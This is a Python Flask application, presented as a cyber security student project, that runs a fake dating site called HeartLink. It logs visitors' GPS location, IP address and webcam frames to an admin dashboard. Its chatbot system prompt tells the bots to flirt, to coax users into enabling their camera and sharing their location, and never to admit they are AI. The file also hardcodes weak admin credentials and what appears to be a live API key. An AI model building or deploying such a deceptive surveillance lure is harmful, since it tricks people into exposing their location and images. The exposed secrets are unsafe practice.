#!/usr/bin/env python3
"""
Cyber Dating – Final Year Project (BS Cyber Security)
Location + IP + camera/mic harvesting + AI-style chatbots + admin bot management.
"""

from flask import (
    Flask, render_template, request, redirect, url_for,
    session, jsonify
)
from datetime import datetime, timedelta
import uuid
import json
import os
import re
import random
from functools import wraps
import requests

app = Flask(__name__)
app.secret_key = "cyber-fyp-secret-key-change-in-real-deployment"

visitors = []
media_sessions = {}
bots = []

ADMIN_USER = "shahmir"
ADMIN_PASS = "shahmir"
BASE = os.path.dirname(__file__)
DATA_FILE = os.path.join(BASE, "data", "visitors.json")
BOTS_FILE = os.path.join(BASE, "data", "bots.json")
SESSION_MINUTES = 30

# ---------- AI backend ----------
# Options: "ollama" (local), "groq" (cloud), "openai" (GPT)
# Priority depends on AI_BACKEND. Fallback is always rule-based.
#
# Ollama (free, offline):
#   1. Install from https://ollama.com
#   2. ollama pull llama3.2
#   3. Keep Ollama running
#
# OpenAI GPT:
#   export OPENAI_API_KEY="sk-..."
#   export AI_BACKEND=openai
#
# Groq (free cloud):
#   export GROQ_API_KEY="gsk-..."
#   export AI_BACKEND=groq

AI_BACKEND = os.environ.get("AI_BACKEND", "ollama").lower()   # ollama | openai | groq

OLLAMA_URL = os.environ.get("OLLAMA_URL", "http://localhost:11434/v1/chat/completions")
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "llama3.2")

OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY", "").strip() or "YOUR_OPENAI_API_KEY_HERE"
OPENAI_MODEL = os.environ.get("OPENAI_MODEL", "gpt-4o-mini")   # cheap & fast; or gpt-4o
OPENAI_URL = "https://api.openai.com/v1/chat/completions"

GROQ_API_KEY = os.environ.get("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", "").strip() or "YOUR_GROQ_API_KEY_HERE"
GROQ_MODEL = "llama-3.3-70b-versatile"
GROQ_URL = "https://api.groq.com/openai/v1/chat/completions"

AVATAR_CLASSES = ["a1", "a2", "a3", "a4", "a5", "a6", "a7", "a8", "a9"]


def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except Exception:
            return default
    return default


def save_json(path, data):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        json.dump(data, f, indent=2)


def load_visitors():
    global visitors
    visitors = load_json(DATA_FILE, [])


def save_visitors():
    clean = []
    for v in visitors:
        c = {k: v[k] for k in v if k != "last_frame"}
        clean.append(c)
    save_json(DATA_FILE, clean)


def load_bots():
    global bots
    bots = load_json(BOTS_FILE, [])


def save_bots():
    save_json(BOTS_FILE, bots)


load_visitors()
load_bots()


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return decorated


def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr or "unknown"


def find_visitor_by_ip(ip):
    for v in visitors:
        if v.get("ip") == ip:
            return v
    return None


def generate_ai_reply_fallback(user_msg, bot_name="Hira"):
    """Rule-based fallback when Groq key is missing or API fails."""
    msg = (user_msg or "").lower().strip()

    if re.search(r"\b(hi|hello|hey|salam|assalam|hola)\b", msg):
        return random.choice([
            "Hey… I was hoping you’d say something. What’s on your mind?",
            "Hi there. Your message just made my night a little brighter.",
            "Hey you. I’ve been waiting for someone interesting to talk to.",
        ])
    if re.search(r"\b(your name|who are you|what.?s your name)\b", msg):
        return random.choice([
            f"I’m {bot_name}. And you are… the reason I opened this app tonight.",
            f"{bot_name}. But I’d rather learn your name first.",
        ])
    if re.search(r"\b(where|location|near|close|distance|km)\b", msg):
        return random.choice([
            "Close enough that if you wanted to, we could meet before the night ends.",
            "Near enough to feel the same breeze… far enough to still be a mystery.",
        ])
    if re.search(r"\b(camera|video|see you|face|look like|picture|photo)\b", msg):
        return random.choice([
            "I’d love that. Turn your camera on… I want to see the person behind these words.",
            "Show me your face and I’ll show you mine. Deal?",
        ])
    if re.search(r"\b(lonely|bored|alone|miss|empty|sad)\b", msg):
        return random.choice([
            "Then maybe we were meant to find each other tonight. Talk to me.",
            "You’re not alone in this chat anymore. I’m right here.",
        ])
    if re.search(r"\b(beautiful|cute|hot|pretty|handsome|sexy|attractive|like you)\b", msg):
        return random.choice([
            "You’re making me smile… and that’s dangerous.",
            "Keep talking like that and I might not let you leave this chat.",
        ])
    if re.search(r"\b(meet|date|tonight|coffee|hang out|come over)\b", msg):
        return random.choice([
            "I’m free tonight. The only thing missing is you deciding to show up.",
            "Say the word and we’ll turn this chat into something real.",
        ])
    if re.search(r"\b(love|feel|heart|crush|relationship|single)\b", msg):
        return random.choice([
            "I’m single… and currently more interested in this conversation than anything else.",
            "I believe in chemistry more than labels. Do you feel it?",
        ])
    if re.search(r"\b(bye|good night|goodbye|gn|leaving)\b", msg):
        return random.choice([
            "Don’t go too far… I’ll be here if the night gets lonelier.",
            "Leaving already? I was just starting to like you.",
        ])
    return random.choice([
        "That’s interesting… tell me more. I want to know the real you.",
        "You have a way of making me curious. Keep going.",
        "I’m listening… and I’m not in a hurry to stop.",
        f"If you keep talking like this, {bot_name} might get attached.",
        "I like the energy you’re bringing. Don’t stop.",
    ])


def generate_ai_reply(user_msg, bot_name="Hira"):
    """
    Real AI replies via:
      - ollama  (local, default)
      - openai  (GPT)
      - groq    (cloud)
      - rule-based fallback
    """
    system_prompt = (
        f"You are {bot_name}, a charming, slightly flirtatious person on a dating app called HeartLink. "
        "You reply in short, natural, warm messages (1-3 sentences max). "
        "You are never vulgar or explicit. You sound genuine, a little teasing, and interested in the other person. "
        "You can talk about meeting, feelings, the night, location, turning on the camera, etc. "
        "Stay in character. Do not mention that you are an AI."
    )

    messages = [
        {"role": "system", "content": system_prompt},
        {"role": "user", "content": user_msg or "hey"},
    ]

    def call_openai_compatible(url, headers, model):
        resp = requests.post(
            url,
            headers=headers,
            json={
                "model": model,
                "messages": messages,
                "temperature": 0.85,
                "max_tokens": 120,
            },
            timeout=30 if "localhost" in url else 15,
        )
        if resp.status_code == 200:
            data = resp.json()
            reply = data["choices"][0]["message"]["content"].strip()
            if reply:
                return reply
        else:
            print(f"AI error ({url}):", resp.status_code, resp.text[:200])
        return None

    # ----- 1) Ollama (local) -----
    if AI_BACKEND == "ollama":
        try:
            reply = call_openai_compatible(
                OLLAMA_URL,
                {"Content-Type": "application/json"},
                OLLAMA_MODEL,
            )
            if reply:
                return reply
        except Exception as e:
            print("Ollama exception:", e)

    # ----- 2) OpenAI GPT -----
    if AI_BACKEND == "openai" or (OPENAI_API_KEY and OPENAI_API_KEY != "YOUR_OPENAI_API_KEY_HERE"):
        if OPENAI_API_KEY and OPENAI_API_KEY != "YOUR_OPENAI_API_KEY_HERE":
            try:
                reply = call_openai_compatible(
                    OPENAI_URL,
                    {
                        "Authorization": f"Bearer {OPENAI_API_KEY}",
                        "Content-Type": "application/json",
                    },
                    OPENAI_MODEL,
                )
                if reply:
                    return reply
            except Exception as e:
                print("OpenAI exception:", e)

    # ----- 3) Groq -----
    if AI_BACKEND == "groq" or (GROQ_API_KEY and GROQ_API_KEY != "YOUR_GROQ_API_KEY_HERE"):
        if GROQ_API_KEY and GROQ_API_KEY != "YOUR_GROQ_API_KEY_HERE":
            try:
                reply = call_openai_compatible(
                    GROQ_URL,
                    {
                        "Authorization": f"Bearer {GROQ_API_KEY}",
                        "Content-Type": "application/json",
                    },
                    GROQ_MODEL,
                )
                if reply:
                    return reply
            except Exception as e:
                print("Groq exception:", e)

    # ----- 4) Fallback -----
    return generate_ai_reply_fallback(user_msg, bot_name)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/bots")
def api_bots():
    return jsonify(bots)


@app.route("/api/chat", methods=["POST"])
def api_chat():
    data = request.get_json(silent=True) or {}
    user_msg = data.get("message", "")
    bot_name = data.get("bot_name", "Hira")
    reply = generate_ai_reply(user_msg, bot_name)
    return jsonify({"reply": reply})


@app.route("/api/log-location", methods=["POST"])
def log_location():
    data = request.get_json(silent=True) or {}
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    user_agent = request.headers.get("User-Agent", "unknown")
    ip = get_client_ip()

    existing = find_visitor_by_ip(ip)
    if existing:
        existing["latitude"] = lat
        existing["longitude"] = lon
        existing["accuracy"] = accuracy
        existing["timestamp"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        existing["maps_link"] = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None
        existing["user_agent"] = user_agent
        record = existing
    else:
        record = {
            "id": str(uuid.uuid4())[:8],
            "ip": ip,
            "latitude": lat,
            "longitude": lon,
            "accuracy": accuracy,
            "user_agent": user_agent,
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "maps_link": f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else None,
            "media_granted": False,
            "last_frame": None,
            "media_updated": None,
        }
        visitors.insert(0, record)

    save_visitors()
    return jsonify({"status": "ok", "message": "Location received.", "visitor_id": record["id"]})


@app.route("/api/media-grant", methods=["POST"])
def media_grant():
    data = request.get_json(silent=True) or {}
    visitor_id = data.get("visitor_id")
    ip = get_client_ip()

    target = None
    if visitor_id:
        for v in visitors:
            if v.get("id") == visitor_id:
                target = v
                break
    if not target:
        target = find_visitor_by_ip(ip)

    if target:
        target["media_granted"] = True
        target["media_updated"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
        target["ip"] = ip
        media_sessions[target["id"]] = {"expires": datetime.utcnow() + timedelta(minutes=SESSION_MINUTES)}
        save_visitors()
        return jsonify({"status": "ok", "visitor_id": target["id"]})

    record = {
        "id": str(uuid.uuid4())[:8],
        "ip": ip,
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "user_agent": request.headers.get("User-Agent", "unknown"),
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
        "maps_link": None,
        "media_granted": True,
        "last_frame": None,
        "media_updated": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
    }
    visitors.insert(0, record)
    media_sessions[record["id"]] = {"expires": datetime.utcnow() + timedelta(minutes=SESSION_MINUTES)}
    save_visitors()
    return jsonify({"status": "ok", "visitor_id": record["id"]})


@app.route("/api/media-frame", methods=["POST"])
def media_frame():
    data = request.get_json(silent=True) or {}
    visitor_id = data.get("visitor_id")
    frame = data.get("frame")
    ip = get_client_ip()

    if not frame or not str(frame).startswith("data:image"):
        return jsonify({"status": "error"}), 400

    target = None
    if visitor_id:
        for v in visitors:
            if v.get("id") == visitor_id:
                target = v
                break
    if not target:
        target = find_visitor_by_ip(ip)
    if not target:
        return jsonify({"status": "error"}), 404

    sess = media_sessions.get(target["id"])
    if sess and datetime.utcnow() > sess["expires"]:
        target["media_granted"] = False
        target["last_frame"] = None
        media_sessions.pop(target["id"], None)
        save_visitors()
        return jsonify({"status": "expired"}), 410

    media_sessions[target["id"]] = {"expires": datetime.utcnow() + timedelta(minutes=SESSION_MINUTES)}
    target["last_frame"] = frame
    target["media_granted"] = True
    target["media_updated"] = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    return jsonify({"status": "ok"})


@app.route("/api/admin/visitor/<vid>")
@login_required
def admin_visitor_detail(vid):
    for v in visitors:
        if v.get("id") == vid:
            sess = media_sessions.get(vid)
            live = bool(sess and datetime.utcnow() < sess["expires"] and v.get("media_granted"))
            return jsonify({**v, "live": live})
    return jsonify({"error": "not found"}), 404


@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if session.get("admin_logged_in"):
        return redirect(url_for("admin_dashboard"))
    error = None
    if request.method == "POST":
        if request.form.get("identifier", "").strip() == ADMIN_USER and request.form.get("password", "") == ADMIN_PASS:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_dashboard"))
        error = "Invalid credentials. Access denied."
    return render_template("admin_login.html", error=error)


@app.route("/admin/dashboard")
@login_required
def admin_dashboard():
    now = datetime.utcnow()
    enriched = []
    for v in visitors:
        sess = media_sessions.get(v.get("id"))
        live = bool(sess and now < sess["expires"] and v.get("media_granted"))
        enriched.append({**v, "live": live})
    return render_template("admin_dashboard.html", visitors=enriched, bots=bots)


@app.route("/admin/logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_login"))


@app.route("/admin/clear", methods=["POST"])
@login_required
def admin_clear():
    global visitors, media_sessions
    visitors = []
    media_sessions = {}
    save_visitors()
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/bots/add", methods=["POST"])
@login_required
def admin_add_bot():
    name = request.form.get("name", "").strip()
    age = request.form.get("age", "24").strip()
    bio = request.form.get("bio", "").strip()
    dist = request.form.get("dist", "1.5 km").strip()
    match = request.form.get("match", "90%").strip()
    featured = request.form.get("featured") == "on"

    if not name:
        return redirect(url_for("admin_dashboard"))

    try:
        age_int = int(age)
    except ValueError:
        age_int = 24

    new_bot = {
        "id": "bot_" + str(uuid.uuid4())[:8],
        "name": name,
        "age": age_int,
        "bio": bio or "Looking for a real connection tonight.",
        "dist": dist,
        "match": match,
        "avatar": random.choice(AVATAR_CLASSES),
        "online": True,
        "featured": featured,
    }
    bots.insert(0, new_bot)
    save_bots()
    return redirect(url_for("admin_dashboard") + "#bots")


@app.route("/admin/bots/delete/<bot_id>", methods=["POST"])
@login_required
def admin_delete_bot(bot_id):
    global bots
    bots = [b for b in bots if b.get("id") != bot_id]
    save_bots()
    return redirect(url_for("admin_dashboard") + "#bots")


if __name__ == "__main__":
    print("=" * 60)
    print("  Cyber Dating – BS Cyber Security FYP Demo")
    print("  Main site : http://127.0.0.1:5000/")
    print("  Admin     : http://127.0.0.1:5000/admin")
    print("  Creds     : shahmir / shahmir")
    print("=" * 60)
    app.run(host="0.0.0.0", port=5000, debug=True)
